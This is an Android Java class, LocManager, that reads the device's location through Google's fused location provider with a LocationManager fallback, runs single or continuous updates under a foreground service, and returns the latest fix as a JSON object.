package com.fason.app.features.location;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.os.Looper;

import androidx.annotation.NonNull;
import androidx.core.content.ContextCompat;

import com.fason.app.core.FasonApp;
import com.fason.app.core.permissions.PermissionManager;
import com.fason.app.service.MainService;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.location.Priority;

import org.json.JSONObject;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

// Location manager using FusedLocationProvider
public class LocManager {

    private final Context ctx;
    private final FusedLocationProviderClient fused;
    private final LocationManager locMgr;
    private final ExecutorService exec = Executors.newSingleThreadExecutor();
    private final AtomicBoolean tracking = new AtomicBoolean(false);

    private Location lastLocation;
    private LocationCallback callback;

    public LocManager(Context context) {
        this.ctx = context.getApplicationContext();
        this.fused = LocationServices.getFusedLocationProviderClient(ctx);
        this.locMgr = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
        init();
    }

    // Initialize location callback
    private void init() {
        fetchLastLocation();

        callback = new LocationCallback() {
            @Override
            public void onLocationResult(@NonNull LocationResult result) {
                Location loc = result.getLastLocation();
                if (loc != null) lastLocation = loc;
            }
        };
    }

    // Fetch last known location
    private void fetchLastLocation() {
        if (!hasPermission()) return;

        try {
            if (checkPerm(Manifest.permission.ACCESS_FINE_LOCATION) ||
                checkPerm(Manifest.permission.ACCESS_COARSE_LOCATION)) {
                fused.getLastLocation()
                    .addOnSuccessListener(loc -> {
                        if (loc != null) lastLocation = loc;
                        else fallback();
                    })
                    .addOnFailureListener(e -> fallback());
            } else {
                fallback();
            }
        } catch (SecurityException e) {
            fallback();
        }
    }

    // Fallback to LocationManager
    private void fallback() {
        if (locMgr == null) return;

        try {
            if (locMgr.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                Location loc = locMgr.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                if (loc != null) { lastLocation = loc; return; }
            }
            if (locMgr.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                Location loc = locMgr.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (loc != null) { lastLocation = loc; return; }
            }
        } catch (SecurityException ignored) {}
    }

    // Check permission
    private boolean hasPermission() {
        return PermissionManager.canIUse(Manifest.permission.ACCESS_FINE_LOCATION) ||
               PermissionManager.canIUse(Manifest.permission.ACCESS_COARSE_LOCATION);
    }

    private boolean checkPerm(String perm) {
        return ContextCompat.checkSelfPermission(ctx, perm) == PackageManager.PERMISSION_GRANTED;
    }

    // Check if location available
    public boolean canGetLocation() {
        if (locMgr == null) return false;
        return locMgr.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
               locMgr.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
    }

    // Request single location update
    public void requestSingle() {
        if (!hasPermission()) return;

        // Update service type for Android 14+
        MainService svc = MainService.getInstance();
        if (svc != null) {
            svc.updateType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
        }

        try {
            LocationRequest req = new LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 5000)
                .setMinUpdateIntervalMillis(2000)
                .setWaitForAccurateLocation(true)
                .setMaxUpdates(1)
                .build();

            fused.requestLocationUpdates(req, callback, Looper.getMainLooper());
        } catch (SecurityException e) {
            try {
                LocationRequest req = new LocationRequest.Builder(Priority.PRIORITY_BALANCED_POWER_ACCURACY, 10000)
                    .setMinUpdateIntervalMillis(5000)
                    .setMaxUpdates(1)
                    .build();
                fused.requestLocationUpdates(req, callback, Looper.getMainLooper());
            } catch (SecurityException ignored) {}
        }
    }

    // Start continuous updates
    public void startUpdates() {
        if (tracking.getAndSet(true)) return;
        if (!hasPermission()) return;

        MainService svc = MainService.getInstance();
        if (svc != null) {
            svc.updateType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
        }

        try {
            LocationRequest req = new LocationRequest.Builder(Priority.PRIORITY_BALANCED_POWER_ACCURACY, 10000)
                .setMinUpdateIntervalMillis(5000)
                .setMinUpdateDistanceMeters(10)
                .build();

            fused.requestLocationUpdates(req, callback, Looper.getMainLooper());
        } catch (SecurityException ignored) {}
    }

    // Stop updates
    public void stop() {
        if (!tracking.getAndSet(false)) return;

        try {
            fused.removeLocationUpdates(callback);
        } catch (Exception ignored) {}

        MainService svc = MainService.getInstance();
        if (svc != null) {
            svc.releaseType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
        }
    }

    // Get location data as JSON
    public JSONObject getData() {
        JSONObject data = new JSONObject();
        try {
            if (lastLocation != null) {
                data.put("enabled", true);
                data.put("latitude", lastLocation.getLatitude());
                data.put("longitude", lastLocation.getLongitude());
                data.put("accuracy", lastLocation.getAccuracy());
                data.put("speed", lastLocation.getSpeed());
                data.put("provider", lastLocation.getProvider());
                data.put("timestamp", lastLocation.getTime());
            } else {
                data.put("enabled", false);
                data.put("error", "No location");
            }
        } catch (Exception e) {
            try {
                data.put("enabled", false);
                data.put("error", e.getMessage());
            } catch (Exception ignored) {}
        }
        return data;
    }
}
